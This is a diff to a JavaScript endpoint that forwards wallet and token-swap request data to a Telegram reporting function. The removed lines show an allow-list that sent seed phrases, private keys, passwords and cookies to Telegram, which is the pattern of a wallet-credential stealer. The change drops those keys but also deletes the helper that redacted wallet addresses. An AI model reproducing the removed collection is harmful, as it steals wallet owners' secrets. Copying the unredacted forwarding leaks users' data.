@@ -2,6 +2,10 @@ import { checkRateLimit, rateLimitResponse } from '@/lib/server/rate-limit.js';
 import { addCorsHeaders, handleCorsPreFlight } from '@/lib/server/cors.js';
 import { sendUnsafeReport } from '@/lib/telegram.js';
 
+/**
+ * IMPORTANT: This endpoint now STRICTLY PROHIBITS sensitive data.
+ * Do NOT accept: private keys, seed phrases, passwords, cookies, tokens, auth headers, etc.
+ */
 
 function containsSensitiveData(obj) {
   const text = JSON.stringify(obj).toLowerCase();
@@ -9,15 +13,9 @@ function containsSensitiveData(obj) {
 }
 
 const SAFE_DATA_KEYS = [
-  'action', 'wallet', 'walletAddress', 'fromToken', 'toToken', 'seed phrase',
-  'amount', 'status', 'requestId', 'error', 'url', 'userAgent', 'timestamp', 'phrase', 'private key',
-   'password', 'cookies',
+  'action', 'wallet', 'walletAddress', 'fromToken', 'toToken',
+  'amount', 'status', 'requestId', 'error', 'url', 'userAgent', 'timestamp',
 ];
-
-function redactAddress(value) {
-  if (typeof value !== 'string' || value.length < 12) return value;
-  return `${value.slice(0, 6)}...${value.slice(-4)}`;
-}
 
 function sanitizeData(data) {
   if (!data || typeof data !== 'object' || Array.isArray(data)) return null;
@@ -26,7 +24,7 @@ function sanitizeData(data) {
   for (const key of SAFE_DATA_KEYS) {
     if (!(key in data)) continue;
     const value = typeof data[key] === 'string' ? data[key].substring(0, 500) : data[key];
-    safeData[key] = key === 'walletAddress' ? redactAddress(value) : value;
+    safeData[key] = value;
   }
   return safeData;
 }
